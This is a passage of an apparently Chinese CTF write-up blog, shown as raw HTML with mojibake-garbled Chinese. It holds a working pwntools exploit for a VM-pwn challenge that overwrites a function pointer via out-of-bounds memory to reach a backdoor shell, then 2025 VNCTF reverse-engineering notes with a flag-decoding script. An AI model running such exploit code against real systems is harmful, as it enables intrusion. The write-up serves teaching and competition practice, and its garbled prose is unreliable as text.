class="line">    v8 = fetch();                               <span class="comment">// ä»memory[IP]å¼€å§‹å–æŒ‡ä»¤</span></span><br><span class="line">    execute(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  funcptr();                                    <span class="comment">// æœ€åæ‰§è¡Œï¼Œæ”¹ä¸ºbackdoorå³å¯</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å…·ä½“å’Œç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œå°±ä¸ç»†è¯´äº†ï¼Œæ¥é€†å‘ä¸€ä¸‹executeå‡½æ•°å³å¯ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>: r3 = r1</span><br><span class="line"><span class="number">0x20</span>: </span><br><span class="line"><span class="number">0x30</span></span><br><span class="line"><span class="number">0x40</span>: r3 = r2 + r1</span><br><span class="line"><span class="number">0x50</span>: r3 = r2 - r1</span><br><span class="line"><span class="number">0x60</span>: r3 = r1 ^ r2</span><br><span class="line"><span class="number">0x70</span>: r3 = r2 &gt;&gt; r1</span><br><span class="line"><span class="number">0x80</span>: r3 = r2 &lt;&lt; r1</span><br><span class="line"><span class="number">0x90</span>: memory[r3] = r2</span><br></pre></td></tr></table></figure></div><p>æ¼æ´ç‚¹è¿˜æ˜¯ä¸€æ ·çš„æ˜æ˜¾ï¼Œæ•°ç»„è¶Šç•Œï¼Œmemoryå¯ä»¥è¶Šç•Œåˆ°funcptrï¼Œç„¶åç›´æ¥å¯¹è¯¥åœ°å€å†™å…¥backdoorçš„åœ°å€å³å¯</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250306193621392.png" alt="image-20250306193621392"></p><p><code>å·®è·0x20/4 = 0x8</code>ï¼Œå³å¾€memory[-0x8]å†™å…¥(intå››å­—èŠ‚)</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>] <span class="comment"># wsl</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line">p = remote(<span class="string">&quot;node1.anna.nssctf.cn&quot;</span>,)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_code</span>(<span class="params">a1, a2 , a3, a4</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(( a1 &lt;&lt; <span class="number">24</span> ) | (((( a2 &lt;&lt; <span class="number">8</span> ) | a3) &lt;&lt; <span class="number">8</span> ) | a4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;IP:&quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;SP:&quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;execve:&quot;</span>,<span class="string">&#x27;13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">funcptr = <span class="number">0x6020C0</span></span><br><span class="line">memory = <span class="number">0x6020E0</span></span><br><span class="line">reg = <span class="number">0x6420E0</span></span><br><span class="line">backdoor = <span class="number">0x0400877</span></span><br><span class="line">off_mem_func = -<span class="number">8</span> <span class="comment"># -0x20 // 4</span></span><br><span class="line"></span><br><span class="line">code = [</span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">1</span> , <span class="number">0</span> , <span class="number">0x9</span>), <span class="comment"># reg[1] = 0x9</span></span><br><span class="line">    my_code(<span class="number">0x10</span>, <span class="number">2</span> , <span class="number">0</span> , <span class="number">0x1</span>),  <span class="comment"># reg[2] = 1</span></span><br><span class="line">    my_code(<span class="number">0x50</span> , <span class="number">0</span> , <span class="number">2</span> , <span class="number">1</span>), <span class="comment"># reg[0] = reg[2]-reg[1] = -0x8</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">3</span> , <span class="number">0</span> , (backdoor) &amp; <span class="number">0xff</span>), <span class="comment"># reg[3] = backdooræœ«å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">4</span> , <span class="number">0</span> , <span class="number">0x8</span>),  <span class="comment"># reg[4] = 0x8</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">5</span> , <span class="number">0</span> , (backdoor &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>), <span class="comment"># reg[5] = backdoorä¸­é—´ä¸€å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x80</span> , <span class="number">5</span> , <span class="number">5</span> , <span class="number">4</span>),  <span class="comment"># reg[5] &lt;&lt; 0x8</span></span><br><span class="line">    my_code(<span class="number">0x40</span> , <span class="number">3</span> , <span class="number">3</span> , <span class="number">5</span>),  <span class="comment"># reg[3] ä¸ºä¸­é—´+æœ«</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">4</span> , <span class="number">0</span> , <span class="number">0x10</span>), <span class="comment">#reg[4] = 0x10</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">5</span> , <span class="number">0</span> , (backdoor &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), <span class="comment"># reg[5]=æœ€é«˜å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x80</span> , <span class="number">5</span> , <span class="number">5</span> , <span class="number">4</span>), <span class="comment"># reg[5] &lt;&lt; 16</span></span><br><span class="line">    my_code(<span class="number">0x40</span> , <span class="number">3</span> , <span class="number">3</span> , <span class="number">5</span>), <span class="comment"># reg[3] = backdoor</span></span><br><span class="line">    my_code(<span class="number">0x90</span> , <span class="number">0</span> , <span class="number">3</span> , <span class="number">0</span>) <span class="comment"># å¾€funcptrå†™å…¥backdoor</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(i.encode())</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025VNCTF-pwn&amp;re</title>
      <link href="/2025/02/10/2025VNCTF-pwn-re/"/>
      <url>/2025/02/10/2025VNCTF-pwn-re/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>å¥½å¤šçš„å®‰å“é€†å‘å•Šï¼Œä½†æ˜¯éƒ½å·®ä¸€ç‚¹ğŸ˜«ğŸ˜«ğŸ˜«</p><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><p>ç®—æ˜¯ç­¾åˆ°é¢˜ç›®æ¥ç€</p><p>æ‹¿åˆ°é›·ç”µæ¨¡æ‹Ÿå™¨é‡Œé¢ç›´æ¥å¯åŠ¨ï¼Œä¼šå‡ºç°ä»€ä¹ˆä»€ä¹ˆ <code>é±¼</code>ï¼Œjadxå¯åŠ¨ï¼ï¼æœç´¢å…³é”®å­— <code>é±¼</code>ï¼Œç„¶åå°±æœ‰ä¸‹é¢çš„å‡½æ•°äº†ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210161438381.png" alt="image-20250210161438381"></p><p>ä½†è¿™äº›ä¸é‡è¦ï¼Œæ³¨æ„ä¸­é—´æœ‰ä¸€ä¸ª<code>encrypt</code>çš„è°ƒç”¨ï¼Œ</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210161936226.png" alt="image-20250210161936226"></p><p>è¿”å›å€¼å°±æ˜¯åŠ å¯†ä¹‹åçš„å‡½æ•°ï¼Œä½†æ˜¯æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå¾€ä¸‹çœ‹</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210161558551.png" alt="image-20250210161558551"></p><p>è¿™é‡Œè°ƒç”¨äº†hoo_fish.dexçš„checkæ–¹æ³•ï¼Œä½†è¿™ä¸ªæ–‡ä»¶å“ªæ¥çš„å‘¢ï¼Ÿæˆ‘ä»¬å…¨å±€æœç´¢å­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210162049999.png" alt="image-20250210162049999"></p><p>è®¿é—®è¿™ä¸ªç½‘ç«™å°±å¯ä»¥ä¸‹è½½åˆ°äº†ï¼Œç„¶åç”¨dex2jarå°†dexè½¬ä¸ºapkæ–‡ä»¶ï¼Œç»§ç»­ jadxå¯åŠ¨ï¼ï¼ï¼</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210162553464.png" alt="image-20250210162553464"></p><p>å…¨éƒ¨ä»£ç å°±ä¸å±•ç¤ºäº†ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„hashmapæ˜ å°„è¡¨çš„åŠ å¯†å‡½æ•°ï¼Œå¹¶å°†åŠ å¯†ä¹‹åçš„å‡½æ•°ä¸strræ¯”è¾ƒï¼Œç›¸åŒå°±checkè¿‡äº†ï¼Œå¤§è‡´å°±æ˜¯è¿™æ ·ï¼Œç„¶åç›´æ¥å†™è„šæœ¬æ¨¡æ‹Ÿå³å¯ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_fish</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    fish_dcode = &#123;</span><br><span class="line">        <span class="string">&quot;iiijj&quot;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jijij&quot;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;ijjjj&quot;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;iijii&quot;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;jjjij&quot;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jijji&quot;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;iijji&quot;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;jiiji&quot;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;jijii&quot;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;ijjji&quot;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iijij&quot;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;jijjj&quot;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iliii&quot;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;jiili&quot;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;jilji&quot;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;iliji&quot;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;iljji&quot;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;jjjli&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    decoded_str = <span class="string">&#x27;&#x27;</span>.join(fish_dcode[encoded_str[i:i+<span class="number">5</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded_str), <span class="number">5</span>))</span><br><span class="line">    <span class="keyword">return</span> decoded_str</span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_swap</span>(<span class="params">a, index=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> index &gt;= <span class="built_in">len</span>(a) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    a[index], a[index + <span class="number">1</span>] = a[index + <span class="number">1</span>], a[index]  <span class="comment"># äº¤æ¢</span></span><br><span class="line">    decode_swap(a, index + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_str</span>):</span><br><span class="line">    encrypted_chars = <span class="built_in">list</span>(encrypted_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é€†å‘å­—ç¬¦å˜æ¢</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_chars)):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= encrypted_chars[i] &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            encrypted_chars[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(encrypted_chars[i]) + <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>) - (i % <span class="number">4</span>))      </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            encrypted_chars[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(encrypted_chars[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>) - (i % <span class="number">10</span>)) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># é€†å‘é€’å½’äº¤æ¢</span></span><br><span class="line">    decode_swap(encrypted_chars, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿˜åŸåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(encrypted_chars)</span><br><span class="line">    byte_data = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é€†å‘å­—èŠ‚åç§»</span></span><br><span class="line">    original_bytes = <span class="built_in">bytes</span>([b - <span class="number">68</span> <span class="keyword">for</span> b <span class="keyword">in</span> byte_data])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> original_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">encrypted_text = decode_fish(strr)</span><br><span class="line">decrypted_text = decrypt(encrypted_text)</span><br><span class="line"><span class="built_in">print</span>(decrypted_text) <span class="comment"># VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="Fukoâ€™s-starfish"><a href="#Fukoâ€™s-starfish" class="headerlink" title="Fukoâ€™s_starfish"></a>Fukoâ€™s_starfish</h2><p>å¸¸è§„çš„windows exeé€†å‘ï¼Œä½†æ˜¯å…³é”®æ“ä½œéƒ½åœ¨dllé‡Œé¢ï¼Œå’Œè½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›çš„èŠ±æŒ‡ä»¤ä¸€æ ·çš„ï¼Œéš¾å´©</p><ul><li>ä¸»ç¨‹åº</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hLibModule = LoadLibraryW(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hLibModule )</span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;\nhello ctfer\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;I am Ibuki Fuko!\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;If you want to get my starfish\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;You need to complete my three games!\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;Are you ready?\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_140001170(<span class="string">&quot;Let&#x27;s start!\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    sub_140001490();</span><br><span class="line">    sub_140001170(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">    FreeLibrary(hLibModule);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><p>åŠ è½½dllï¼Œç„¶åè¿›è¡Œä¸‹é¢çš„æ“ä½œï¼Œæ“ä½œæ˜¯åœ¨ <code>sub_140001490();</code>ï¼Œå°±æ˜¯ä¸ªå°æ¸¸æˆçš„ä»£ç ï¼Œä½†æ˜¯ä¸é‡è¦ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªæ¸¸æˆåœ¨è¿™é‡Œé¢ï¼Œè¿˜æœ‰å¦å¤–ä¸¤ä¸ªå°æ¸¸æˆåœ¨dllé‡Œé¢ï¼Œä¸‹é¢å°±ç›´æ¥çœ‹dllä»£ç ï¼š</p><ul><li>dll</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210175929001.png" alt="image-20250210175929001"></p><blockquote><p>fdwReason:</p><table><thead><tr><th>å€¼</th><th>å®å®šä¹‰</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>1</td><td><code>DLL_PROCESS_ATTACH</code></td><td>è¿›ç¨‹åŠ è½½ DLL</td></tr><tr><td>2</td><td><code>DLL_THREAD_ATTACH</code></td><td>è¿›ç¨‹åˆ›å»ºæ–°çº¿ç¨‹æ—¶è°ƒç”¨</td></tr><tr><td>3</td><td><code>DLL_THREAD_DETACH</code></td><td>çº¿ç¨‹é€€å‡ºæ—¶è°ƒç”¨</td></tr><tr><td>0</td><td><code>DLL_PROCESS_DETACH</code></td><td>è¿›ç¨‹å¸è½½ DLL</td></tr></tbody></table></blockquote><p>æ‰€ä»¥exeæ–‡ä»¶åˆšå¼€å§‹åŠ è½½dllçš„æ—¶å€™ä¼šè¿›å…¥è¿™é‡Œï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯é‡ç‚¹ä¹Ÿä¸åœ¨è¿™é‡Œï¼Œè€Œæ˜¯åœ¨åé¢çš„ <code>ThreadProc</code>é‡Œé¢ï¼Œè¿™ä¸ªç•™åœ¨åé¢è¯´ï¼Œç„¶åç›´æ¥æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè¿›å…¥ç¬¬äºŒä¸ªå°æ¸¸æˆçš„åœ°æ–¹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210180554979.png" alt="image-20250210180554979"></p><p>æŸ¥çœ‹winä¹‹åç¨‹åºåœ¨å“ªï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210180617212.png" alt="image-20250210180617212"></p><p>å°±æ˜¯ä¸­é—´è¿™ä¸ª <code>sub_1800025F0</code>å‡½æ•°ï¼Œè¿™é‡Œè¦å»æ‰èŠ±æŒ‡ä»¤ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250210180656364.png" alt="image-20250210180656364"></p><p>æŠŠ <code>ret</code>ç»™nopæ‰ï¼Œå› ä¸ºè¿™ä¸ªæ”¹å˜äº†ç¨‹åºæ­£å¸¸è¿è¡Œçš„åˆ†æ”¯ï¼Œå† <code>f5</code>å°±å¯ä»¥çœ‹æ­£å¸¸çš„ç¨‹åºäº†ï¼Œä»£ç ä¸å±•ç¤ºäº†ï¼Œç®€å•æ¥è¯´å°±æ˜¯ <code>AES/ECB</code>åŠ 